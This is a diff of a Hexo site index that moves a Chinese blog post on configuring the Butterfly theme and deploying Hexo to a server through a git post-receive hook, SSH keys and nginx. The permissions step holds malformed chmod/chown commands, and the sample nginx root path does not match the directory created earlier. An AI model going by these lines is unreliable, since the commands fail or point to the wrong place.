-<p>如果提示你克隆了一个空仓库，代表成功</p>
-<p>但是每次都要输入密码才能上传</p>
-<p>这时候我们就要用到<code>rsa</code>加密进行身份验证，以后就不用输入密码</p>
-</blockquote>
-<h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /home/git  #进到git目录</span><br><span class="line">su git    //切换git用户</span><br><span class="line">mkdir /home/git/.ssh  </span><br><span class="line">vi /home/git/.ssh/authorized_keys	#输入公钥</span><br></pre></td></tr></table></figure>
-
-<p>在之前的hexo与github仓库绑定时应该已经生成过</p>
-<p>我们可以再生成一次用来查看密钥位置</p>
-<p><code>ssh-keygen -t rsa</code></p>
-<p>会发现目录下有<code>id_rsa.pub</code>即公钥</p>
-<p>将公钥内容输入<code>/home/git/.ssh/authorized_keys</code></p>
-<blockquote>
-<p>最后在hexo bash 输入一下命令，如果不再输入密码，即配置成功</p>
-</blockquote>
-<p><code>ssh git@ip</code></p>
-<h2 id="配置网站根目录"><a href="#配置网站根目录" class="headerlink" title="配置网站根目录"></a>配置网站根目录</h2><p><code>nginx -t //查看nginx配置文件位置</code></p>
-<ul>
-<li>ubuntu</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>centos</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/blog.conf</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-<blockquote>
-<p>不同版本的nginx或系统，nginx的配置文件不一定相同</p>
-</blockquote>
-<p>如果文件中有以下内容，就找对了文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    root /hexo/git/hexo; # 修改的地方,改为设置的网站根目录的路径</span><br><span class="line">    server_name laoyuyu.me www.laoyuyu.me;  # 如果需要改域名访问，修改server_name 为域名便可</span><br><span class="line">    location / &#123;</span><br><span class="line">            # First attempt to serve request as file, then</span><br><span class="line">            # as directory, then fall back to displaying a 404.</span><br><span class="line">            try_files $uri $uri/ =404;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="最后重启服务，让NGINX生效"><a href="#最后重启服务，让NGINX生效" class="headerlink" title="最后重启服务，让NGINX生效"></a>最后重启服务，让NGINX生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>
-
-<p>此时访问自己的ip可能出现403的情况，可能是因为没有上传东西。</p>
-<p>编辑<code>hexo _config.yml</code>文件</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git <span class="comment">#用户名</span></span><br><span class="line">repo: git@ip:/zzl/blog.git <span class="comment">#Git仓库地址，ip为公网ip :符号后为Git仓库服务器路径</span></span><br><span class="line">branch: master <span class="comment">#分支，由于我们只用Git进行发布，master即可。</span></span><br></pre></td></tr></table></figure>
-
-<p><code>hexo d</code>上传之后再访问ip就可以了</p>
-<p>最后说一下git用户的权限更改</p>
-<h1 id="为了安全考虑-更改GIT用户的SHELL-权限"><a href="#为了安全考虑-更改GIT用户的SHELL-权限" class="headerlink" title="为了安全考虑,更改GIT用户的SHELL 权限"></a>为了安全考虑,更改GIT用户的SHELL 权限</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which git-shell  #返回git-shell的安装目录，如：/usr/bin/git-shell</span><br><span class="line">cat /etc/shells	#如果文件不存在或没有/usr/bin/git-shell，则需要使用vim增加路径</span><br><span class="line">sudo vim /etc/shells</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/usr/bin/git-shell # 添加你的git-shell</span><br></pre></td></tr></table></figure>
-
-<p><code>vim /etc/passwd</code></p>
-<p>找到类似<code>/home/git:/bin/bash</code></p>
-<p>更改<code>/bin/bash</code>修改为<code>/usr/bin/git-shell</code></p>
-<blockquote>
-<p>千万不要将root的<code>/bin/bash</code>修改，否则之后服务器就无法登录</p>
-</blockquote>
-<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>配置挺难，但最后总算学到了什么。</p>
-<blockquote>
-<p>配置hexo到服务器的链接</p>
-</blockquote>
-<ul>
-<li><a href="http://roclinux.cn/?p=2551" target="_blank" rel="noopener">ssh相关</a></li>
-<li><a href="http://taqini.space/2020/02/12/start-with-hexo/#%E6%89%A7%E8%A1%8C%E9%83%A8%E7%BD%B2%E5%91%BD%E4%BB%A4-1" target="_blank" rel="noopener">博文一</a></li>
-<li><a href="https://www.laoyuyu.me/2017/10/10/hexo_deploy_vps/" target="_blank" rel="noopener">博文2</a></li>
-<li><a href="https://www.moonback.xyz/2019/10/19/hexo-deploy-aliyun/" target="_blank" rel="noopener">博文3</a></li>
-<li><a href="https://segmentfault.com/a/1190000005723321" target="_blank" rel="noopener">博文4</a></li>
-<li><a href="https://www.cnblogs.com/reblue520/p/6239733.html" target="_blank" rel="noopener">nginx 403错误</a></li>
-<li><a href="https://blog.csdn.net/qq_35843543/article/details/81561240" target="_blank" rel="noopener">nginx 403错误2</a></li>
-<li><a href="https://www.cnblogs.com/shuo1208/p/6702531.html" target="_blank" rel="noopener">nginx重装等命令</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>搭建博客</category>
-      </categories>
-      <tags>
-        <tag>Butterfly</tag>
-        <tag>hexo</tag>
-        <tag>nginx</tag>
-        <tag>git</tag>
-        <tag>ssh</tag>
-      </tags>
   </entry>
   <entry>
     <title>docker基础</title>
@@ -1157,6 +1018,178 @@ CMD [&quot;app.py&quot;]
       </categories>
       <tags>
         <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo Butterfly主题配置及部署到服务器</title>
+    <url>/2020/04/06/hexo%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h1 id="安装Butterfly主题与配置"><a href="#安装Butterfly主题与配置" class="headerlink" title="安装Butterfly主题与配置"></a>安装Butterfly主题与配置</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">这个主题还是很不错的，我花了一个多礼拜的时间来搞。</span><br><span class="line">说明：我安装的是2.0.0版本的，因为以上版本我本地'hexo g'会出错</span><br></pre></td></tr></table></figure>
+
+<h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><p><a href="https://github.com/jerryc127/hexo-theme-butterfly/releases" target="_blank" rel="noopener">资源链接</a> </p>
+<p>直接点击下载比git clone要快的多，下载后解压到<code>hexo themes</code>目录下</p>
+<blockquote>
+<p>我主要将一些问题，配置说一下，要具体配置看<strong>相关博文链接</strong></p>
+</blockquote>
+<h2 id="hexo各目录作用"><a href="#hexo各目录作用" class="headerlink" title="hexo各目录作用"></a>hexo各目录作用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml      <span class="comment">// 站点配置文件</span></span><br><span class="line">├── db.json          <span class="comment">// 缓存文件</span></span><br><span class="line">├── node_modules     <span class="comment">// 安装的插件以及hexo所需的一些nodejs模块</span></span><br><span class="line">├── package.json     <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scaffolds        <span class="comment">// 模版文件	</span></span><br><span class="line">	-draft.md						</span><br><span class="line">	-page.md						</span><br><span class="line">	-post.md</span><br><span class="line">├── source           <span class="comment">// 源文件，用来存放你的文章 md 文件</span></span><br><span class="line">	-_posts</span><br><span class="line">└── themes           <span class="comment">// 主题文件</span></span><br></pre></td></tr></table></figure>
+
+<p>hexo new <file> 默认是post.md，一般放在source中<code>_posts</code>目录，我们写作的博客都在这里。</file></p>
+<p>​    可以在<code>post.md</code>中设置自动生成的博客的格式</p>
+<p>主题下载到themes目录下</p>
+<h2 id="主题目录"><a href="#主题目录" class="headerlink" title="主题目录"></a>主题目录</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.en.md       <span class="comment">// READEME 英文版</span></span><br><span class="line">├── README.md          <span class="comment">// READEME 中文文件</span></span><br><span class="line">├── _config.yml        <span class="comment">// 主题配置文件</span></span><br><span class="line">├── languages         <span class="comment">// 多语言配置文件 可以在hexo的_config.yml中配置</span></span><br><span class="line">├── layout            <span class="comment">// 模板文件</span></span><br><span class="line">├── package.json      <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scripts           <span class="comment">// 主题的脚本文件</span></span><br><span class="line">├── source            <span class="comment">// 主题的资源文件 CSS IMG</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Hexo-的工作原理"><a href="#Hexo-的工作原理" class="headerlink" title="Hexo 的工作原理"></a>Hexo 的工作原理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo g：</span><br><span class="line">    生成静态文件。</span><br><span class="line">    将我们的数据和界面相结合生成静态文件的过程。</span><br><span class="line">    会遍历主题文件中的 source 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 pubild 文件夹中，此时的 <span class="keyword">public</span> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 index.html 作为入口访问你的博客。</span><br><span class="line">hexo d：</span><br><span class="line">    部署文件。</span><br><span class="line">    部署主要是根据在 _config.yml 中配置的 git 仓库或者 coding 的地址，将 <span class="keyword">public</span> 文件上传至 github 或者 coding 中。</span><br><span class="line">    然后再根据上面的 github 提供的 pages 服务呈现出页面。当然你也可以直接将你生成的 <span class="keyword">public</span> 文件上传至你自己的服务器上。</span><br></pre></td></tr></table></figure>
+
+<p>hexo大概就是将本地的文件，经过加工生成html文件。最后可上传到github或服务器上进行访问</p>
+<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><h3 id="菜单的配置"><a href="#菜单的配置" class="headerlink" title="菜单的配置"></a>菜单的配置</h3><p><img alt data-src="https://i.loli.net/2020/04/06/FEwlX7jhDmV4oAq.png" class="lazyload"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:前面是显示的菜单名称</span><br><span class="line">|| 后面写图标名称 菜单图标可在网址里找 https://fontawesome.com/?from=io </span><br><span class="line">列表下面那种是分级目录</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建page-tag等"><a href="#创建page-tag等" class="headerlink" title="创建page tag等"></a>创建page tag等</h3><p>刚开始，标签，分类，友链等都是没有界面的，所以用到命令</p>
+<p> <code>hexo new page &#39;name&#39;</code></p>
+<p>在hexo主目录中输入命令，会在<code>source</code>下出现相应目录</p>
+<p><code>tags</code>的配置</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">date: 2020-04-03 16:20:50</span><br><span class="line">type: "tags"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>
+
+<p>top_img可以设置对应菜单下的图片,可以用图床生成图片链接</p>
+<p><code>link</code>的配置</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: link</span><br><span class="line">date: 2020-04-05 17:34:13</span><br><span class="line">type: "link"</span><br><span class="line">top_img: https://i.loli.net/2020/04/05/hDjZveqHTd1LWsI.png</span><br></pre></td></tr></table></figure>
+
+<p><code>categories</code>的配置</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">date: 2020-04-03 16:20:21</span><br><span class="line">type: "categories"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>
+
+<h3 id="友链的设置"><a href="#友链的设置" class="headerlink" title="友链的设置"></a>友链的设置</h3><p>在hexo的source目录生成 <code>_data</code>里面生成<code>link.yml</code>文件</p>
+<p>文件内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>:</span></span><br><span class="line">  class_name: 友情链接</span><br><span class="line">  link_list:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">      name: <span class="comment">#名称</span></span><br><span class="line">      link: <span class="comment">#博客链接</span></span><br><span class="line">      avatar: <span class="comment">#头像</span></span><br><span class="line">      descr: <span class="comment">#描述</span></span><br><span class="line">    <span class="number">2</span>:</span><br><span class="line">      name:</span><br><span class="line">      link: </span><br><span class="line">      avatar: </span><br><span class="line">      descr:</span><br></pre></td></tr></table></figure>
+
+<p>另外在主题的配置文件中Flink下设置自己的资料</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># 友情鏈接界面設置</span><br><span class="line">Flink:</span><br><span class="line">  headline: 友情链接</span><br><span class="line">  info_headline: 我的Blog资料</span><br><span class="line">  name: Blog 名字： zzl14</span><br><span class="line">  address: Blog 地址： https:<span class="comment">//www.zzl14.xyz/link/</span></span><br><span class="line">  avatar: Blog 主题： Butterfly</span><br><span class="line">  info: Blog 简介： 日常学习总结</span><br><span class="line">  comment: 交换友链,请留言</span><br></pre></td></tr></table></figure>
+
+<p>界面如下<img alt="QQ截图20200406151505.png" data-src="https://i.loli.net/2020/04/06/TsqmJpDIulwQeCF.png" class="lazyload"></p>
+<h3 id="文章的图片设置"><a href="#文章的图片设置" class="headerlink" title="文章的图片设置"></a>文章的图片设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">category: &#123;&#123; category &#125;&#125;</span><br><span class="line">tags:</span><br><span class="line">top_img: <span class="comment">#文章顶部图片路径</span></span><br><span class="line">cover: <span class="comment">#封面路径</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="搜索框的设置"><a href="#搜索框的设置" class="headerlink" title="搜索框的设置"></a>搜索框的设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true <span class="comment">#主题配置中设置为true,并在hexo主目录使用如下命令下载依赖，</span></span><br><span class="line">    </span><br><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
+
+<p>具体配置过程可能艰辛，但是慢慢来。</p>
+<h1 id="相关博文链接"><a href="#相关博文链接" class="headerlink" title="相关博文链接"></a>相关博文链接</h1><p><a href="https://ciweigg2.github.io/2019/07/04/hexo-theme-butterfly-zhu-ti-an-zhuang-ya/#toc-heading-5" target="_blank" rel="noopener">详细博文1</a></p>
+<p><a href="http://www.c-hasel.cn/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%BA%8C/#%E5%AF%BC%E8%88%AA%E8%8F%9C%E5%8D%95" target="_blank" rel="noopener">详细博文2</a></p>
+<p><a href="http://yearito.cn/posts/hexo-get-started.html" target="_blank" rel="noopener">系列博文</a></p>
+<h1 id="hexo部署到服务器"><a href="#hexo部署到服务器" class="headerlink" title="hexo部署到服务器"></a>hexo部署到服务器</h1><p>由于github仓库的访问速度可能较慢，可能有必要搭建到服务器上进行访问。</p>
+<p>但是之后感觉其实没有太大必要</p>
+<p>先放一幅原理图（<a href="https://www.jianshu.com/p/e1ccd49b4e5d" target="_blank" rel="noopener">别人博客</a>的）</p>
+<p><img alt data-src="https://i.loli.net/2020/04/06/GPlK9CujERi4mk3.png" class="lazyload"></p>
+<p>所以我们需要在服务器搭建git仓库，下载Nginx，通过hooks将仓库部署到网站</p>
+<p>大致思路是</p>
+<p>1.本地上传到服务器的git仓库</p>
+<p>2.通过git仓库的hooks（钩子）将文件放到服务器的网站根目录（自己设置）</p>
+<p>3.通过Nginx将网站根目录的内容在公网ip进行展示</p>
+<blockquote>
+<p>安装nginx</p>
+<p>创建git用户</p>
+</blockquote>
+<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@ip		#登录服务器</span><br><span class="line"></span><br><span class="line">sudo apt-get install nginx	(有时要用到 sudo apt-get update)</span><br><span class="line"><span class="meta">	#</span><span class="bash"> 或者</span></span><br><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>
+
+<h2 id="新建git用户"><a href="#新建git用户" class="headerlink" title="新建git用户"></a>新建git用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo adduser git		#新建git用户，下面会输入</span><br></pre></td></tr></table></figure>
+
+<h3 id="建立服务器端git仓库"><a href="#建立服务器端git仓库" class="headerlink" title="建立服务器端git仓库"></a>建立服务器端git仓库</h3><blockquote>
+<p>可以在hexo bash上上传到仓库</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo mkdir /zzl   # 创建个人git目录</span><br><span class="line">$ cd /zzl</span><br><span class="line">$ sudo mkdir blog.git  # 创建仓库</span><br><span class="line">$ cd blog.git</span><br><span class="line">$ sudo git init --bare # 初始化仓库</span><br></pre></td></tr></table></figure>
+
+<h3 id="建立网站根目录"><a href="#建立网站根目录" class="headerlink" title="建立网站根目录"></a>建立网站根目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p /home/git/hexo</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="改目录权限"><a href="#改目录权限" class="headerlink" title="改目录权限"></a>改目录权限</h3><blockquote>
+<p>因为在hexo的配置文件中repo选项是通过git进行上传</p>
+<p>所以要把目录权限给到git，并将用户目录权限改为775，即允许git用户写入</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chown -R git:git /zzl /home/git/hexochmod -R git 775</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod -R git 775</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="编辑hook函数"><a href="#编辑hook函数" class="headerlink" title="编辑hook函数"></a>编辑hook函数</h3><blockquote>
+<p>将上传到仓库的文件转到网站根目录</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /zzl/blog.git/hooks/post-receive</span></span><br></pre></td></tr></table></figure>
+
+<p>填入以下内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">git --work-tree=/home/git/hexo --git-dir=/zzl/blog.git checkout -f</span><br></pre></td></tr></table></figure>
+
+<h3 id="在本地hexo-bash测试"><a href="#在本地hexo-bash测试" class="headerlink" title="在本地hexo bash测试"></a>在本地hexo bash测试</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@your_server_ip:/zzl/blog.git</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果提示你克隆了一个空仓库，代表成功</p>
+<p>但是每次都要输入密码才能上传</p>
+<p>这时候我们就要用到<code>rsa</code>加密进行身份验证，以后就不用输入密码</p>
+</blockquote>
+<h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /home/git  #进到git目录</span><br><span class="line">su git    //切换git用户</span><br><span class="line">mkdir /home/git/.ssh  </span><br><span class="line">vi /home/git/.ssh/authorized_keys	#输入公钥</span><br></pre></td></tr></table></figure>
+
+<p>在之前的hexo与github仓库绑定时应该已经生成过</p>
+<p>我们可以再生成一次用来查看密钥位置</p>
+<p><code>ssh-keygen -t rsa</code></p>
+<p>会发现目录下有<code>id_rsa.pub</code>即公钥</p>
+<p>将公钥内容输入<code>/home/git/.ssh/authorized_keys</code></p>
+<blockquote>
+<p>最后在hexo bash 输入一下命令，如果不再输入密码，即配置成功</p>
+</blockquote>
+<p><code>ssh git@ip</code></p>
+<h2 id="配置网站根目录"><a href="#配置网站根目录" class="headerlink" title="配置网站根目录"></a>配置网站根目录</h2><p><code>nginx -t //查看nginx配置文件位置</code></p>
+<ul>
+<li>ubuntu</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>centos</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/blog.conf</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<blockquote>
+<p>不同版本的nginx或系统，nginx的配置文件不一定相同</p>
+</blockquote>
+<p>如果文件中有以下内容，就找对了文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    root /hexo/git/hexo; # 修改的地方,改为设置的网站根目录的路径</span><br><span class="line">    server_name laoyuyu.me www.laoyuyu.me;  # 如果需要改域名访问，修改server_name 为域名便可</span><br><span class="line">    location / &#123;</span><br><span class="line">            # First attempt to serve request as file, then</span><br><span class="line">            # as directory, then fall back to displaying a 404.</span><br><span class="line">            try_files $uri $uri/ =404;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="最后重启服务，让NGINX生效"><a href="#最后重启服务，让NGINX生效" class="headerlink" title="最后重启服务，让NGINX生效"></a>最后重启服务，让NGINX生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>
+
+<p>此时访问自己的ip可能出现403的情况，可能是因为没有上传东西。</p>
+<p>编辑<code>hexo _config.yml</code>文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git <span class="comment">#用户名</span></span><br><span class="line">repo: git@ip:/zzl/blog.git <span class="comment">#Git仓库地址，ip为公网ip :符号后为Git仓库服务器路径</span></span><br><span class="line">branch: master <span class="comment">#分支，由于我们只用Git进行发布，master即可。</span></span><br></pre></td></tr></table></figure>
+
+<p><code>hexo d</code>上传之后再访问ip就可以了</p>
+<p>最后说一下git用户的权限更改</p>
+<h1 id="为了安全考虑-更改GIT用户的SHELL-权限"><a href="#为了安全考虑-更改GIT用户的SHELL-权限" class="headerlink" title="为了安全考虑,更改GIT用户的SHELL 权限"></a>为了安全考虑,更改GIT用户的SHELL 权限</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which git-shell  #返回git-shell的安装目录，如：/usr/bin/git-shell</span><br><span class="line">cat /etc/shells	#如果文件不存在或没有/usr/bin/git-shell，则需要使用vim增加路径</span><br><span class="line">sudo vim /etc/shells</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/usr/bin/git-shell # 添加你的git-shell</span><br></pre></td></tr></table></figure>
+
+<p><code>vim /etc/passwd</code></p>
+<p>找到类似<code>/home/git:/bin/bash</code></p>
+<p>更改<code>/bin/bash</code>修改为<code>/usr/bin/git-shell</code></p>
+<blockquote>
+<p>千万不要将root的<code>/bin/bash</code>修改，否则之后服务器就无法登录</p>
+</blockquote>
+<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>配置挺难，但最后总算学到了什么。</p>
+<blockquote>
+<p>配置hexo到服务器的链接</p>
+</blockquote>
+<ul>
+<li><a href="http://roclinux.cn/?p=2551" target="_blank" rel="noopener">ssh相关</a></li>
+<li><a href="http://taqini.space/2020/02/12/start-with-hexo/#%E6%89%A7%E8%A1%8C%E9%83%A8%E7%BD%B2%E5%91%BD%E4%BB%A4-1" target="_blank" rel="noopener">博文一</a></li>
+<li><a href="https://www.laoyuyu.me/2017/10/10/hexo_deploy_vps/" target="_blank" rel="noopener">博文2</a></li>
+<li><a href="https://www.moonback.xyz/2019/10/19/hexo-deploy-aliyun/" target="_blank" rel="noopener">博文3</a></li>
+<li><a href="https://segmentfault.com/a/1190000005723321" target="_blank" rel="noopener">博文4</a></li>
+<li><a href="https://www.cnblogs.com/reblue520/p/6239733.html" target="_blank" rel="noopener">nginx 403错误</a></li>
+<li><a href="https://blog.csdn.net/qq_35843543/article/details/81561240" target="_blank" rel="noopener">nginx 403错误2</a></li>
+<li><a href="https://www.cnblogs.com/shuo1208/p/6702531.html" target="_blank" rel="noopener">nginx重装等命令</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>搭建博客</category>
+      </categories>
+      <tags>
+        <tag>ssh</tag>
+        <tag>Butterfly</tag>
+        <tag>hexo</tag>
+        <tag>nginx</tag>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
